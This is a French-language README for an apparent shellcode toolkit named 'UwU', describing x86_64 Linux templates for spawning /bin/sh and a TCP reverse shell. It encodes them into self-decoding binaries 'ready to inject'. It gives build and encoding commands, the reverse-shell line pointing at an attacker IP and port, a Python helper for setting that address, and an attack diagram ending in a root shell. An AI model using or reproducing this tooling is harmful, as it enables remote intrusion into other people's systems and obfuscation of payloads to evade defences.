# 🐾 UwU Shellcode Templates

Templates de shellcode x86_64 Linux prêts à être encodés via le pipeline UwU.

## Fichiers

| Fichier | Description | Taille |
|---------|-------------|--------|
| `exit_clean.s` | Appel `exit(0)` propre. Utile pour tester le pipeline. | ~6 bytes |
| `execve_binsh.s` | Spawn `/bin/sh` via `execve`. Exploitation locale. | ~27 bytes |
| `reverse_shell.s` | Reverse shell TCP vers l'attaquant. | ~87 bytes |

## Prérequis

```bash
apt install nasm binutils   # nasm + ld + objcopy
```

## Utilisation rapide

### 1. Juste compiler et voir les bytes

```bash
chmod +x build.sh
./build.sh execve_binsh.s
```

### 2. Compiler + encoder en UwU directement

```bash
./build.sh execve_binsh.s --encode
```

### 3. Compiler + générer le .bin auto-décodant (prêt à injecter)

```bash
./build.sh reverse_shell.s --generate
# → produit reverse_shell_uwu.bin
```

### 4. Pipeline complet manuel

```bash
# Étape 1 : compiler le template
nasm -f elf64 execve_binsh.s -o execve_binsh.o
ld execve_binsh.o -o execve_binsh
objcopy --dump-section .text=execve_binsh.bin execve_binsh

# Étape 2 : extraire les bytes hex
xxd -p execve_binsh.bin | tr -d '\n'

# Étape 3 : encoder en UwU
python3 ../uwu_cli.py encode <hex_string>

# Étape 4 : générer le shellcode auto-décodant
python3 ../uwu_cli.py generate --hex <hex_string> -o out.bin

# Étape 5 : tester
python3 ../tester.c out.bin    # ou utiliser le tester.c du projet
```

## Configuration du reverse shell

Dans `reverse_shell.s`, chercher les lignes marquées `[CONFIGURE]` :

```asm
; [CONFIGURE] ↓ modifier ici pour changer l'IP et le port
mov rbx, 0xc0a801645c110002 ; sin_family=2, sin_port=4444, sin_addr=192.168.1.100
; [CONFIGURE] ↑
```

### Calculer la valeur pour votre IP/port

```python
import struct, socket

ip   = "192.168.1.100"
port = 4444

sin_family = 0x0002
sin_port   = socket.htons(port)         # big-endian réseau
sin_addr   = struct.unpack(">I", socket.inet_aton(ip))[0]

# Valeur à mettre dans le mov rbx (little-endian 8 bytes)
val = sin_family | (sin_port << 16) | (sin_addr << 32)
print(f"0x{val:016x}")
```

### ⚠️ Null bytes et IPs

Certaines IPs contiennent des octets nuls (ex: `10.0.0.1` → `0x0a000001` → contient `00 00`) ce qui casserait le shellcode si copié via `strcpy`.

**IPs sans null bytes :**
- ✅ `192.168.x.x` (si x > 0)
- ✅ `172.16.x.x`
- ❌ `10.0.0.1`, `127.0.0.1`

## Flux d'attaque complet

```
[Attaquant]                          [Cible]
    │                                    │
    │  nc -lvnp 4444                     │
    │                                    │
    │  build.sh reverse_shell.s          │
    │  → reverse_shell_uwu.bin           │
    │                                    │
    │  ──── injection du .bin ──────────►│
    │                                    │ décodeur UwU s'exécute en RAM
    │                                    │ reconstruit le shellcode original
    │                                    │ execve("/bin//sh")
    │◄─── connexion TCP retour ──────────│
    │                                    │
    │  $ whoami                          │
    │  root                              │
```
